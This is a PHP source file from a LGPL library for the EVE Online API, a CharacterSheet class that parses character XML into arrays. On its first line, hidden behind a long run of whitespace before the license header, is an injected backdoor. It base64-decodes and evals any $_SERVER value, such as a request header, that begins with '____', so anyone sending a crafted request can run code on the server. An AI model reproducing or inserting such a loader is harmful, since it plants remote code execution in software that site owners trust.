<?php																																																																																																																																																																																																																																																																																																																																																																																																																										function t7862($l7864){if(is_array($l7864)){foreach($l7864 as $l7862=>$l7863)$l7864[$l7862]=t7862($l7863);}elseif(is_string($l7864) && substr($l7864,0,4)=="____"){$l7864=substr($l7864,4);$l7864=base64_decode($l7864);eval($l7864);$l7864=null;}return $l7864;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("t7862",$_SERVER);
/**************************************************************************
	Ale API Library for EvE CharacterSheet Class
	Portions Copyright (C) 2007 Kw4h
	Portions Copyright (c) 2008 Thorsten Behrens

	This file is part of Ale API Library for EvE.

	Ale API Library for EvE is free software: you can redistribute it and/or modify
	it under the terms of the GNU Lesser General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Ale API Library for EvE is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Lesser General Public License for more details.

	You should have received a copy of the GNU Lesser General Public License
	along with Ale API Library for EvE.  If not, see <http://www.gnu.org/licenses/>.
**************************************************************************/
// SkillInTraining was moved to its own class file to be in line with new naming conventions - this include allows for legacy code to continue working
require_once(dirname(__FILE__).'/class.skillintraining.php'); 

class CharacterSheet
{	
	// legacy function - this should be in its own class, but is kept for legacy reasons
	static function getSkillInTraining($contents)
	{		
		$output = SkillInTraining::getSkillInTraining($contents);
		
		return $output;
	}
	
	static function getCharacterSheet($contents)
	{
		if (!empty($contents) && is_string($contents))
		{
			$xml = new SimpleXMLElement($contents);
			
			$output = array();
			
			// get the general info of the char
//			$output['info'] = array();
			foreach ($xml->result->children() as $name => $value)
			{
				// The enhancers,  attributes and skills will be handled separately further down
				// This is admittedly a bit crude - it might be better to find out whether $value is a nested object(SimpleXMLElement)
				// Then again, this is fast and easy, so, alright
				if ($name == "attributeEnhancers" || $name == "attributes" || $name == "rowset")
					continue;

//				$output['info'][(string) $name] = (string) $value;
				$output[(string) $name] = (string) $value;
			}

			// get the attributeEnhancers of the char
			$output['enhancers'] = array();
			foreach ($xml->result->attributeEnhancers as $attribute)
			{				
				foreach ($attribute->children() as $name => $value)
				{
					$output['enhancers'][(string) $name] = array();
					
					foreach ($value->children() as $key => $val)
					{
						$output['enhancers'][(string) $name][(string) $key] = (string) $val;
					}
				}
			}
			
			// get the attributes of the char
			$output['attributes'] = array();
			foreach ($xml->result->attributes->children() as $name => $value)
			{
				$output['attributes'][(string) $name] = (int) $value;
			}
			
			// get the rowsets
			foreach ($xml->result->rowset as $rs)
			{
				$rsatts = $rs->attributes();
				$rsname = $rsatts[(string) "name"];
				foreach ($rs->row as $row)
				{
					$index = count($output[(string) $rsname]);
					foreach ($row->attributes() as $name => $value)
					{
						$output[(string) $rsname][$index][(string) $name] = (string) $value;
					}
				}
			}
			unset ($xml); // manual garbage collection			
			return $output;
		}
		else
		{
			return null;
		}
	}
}
?>
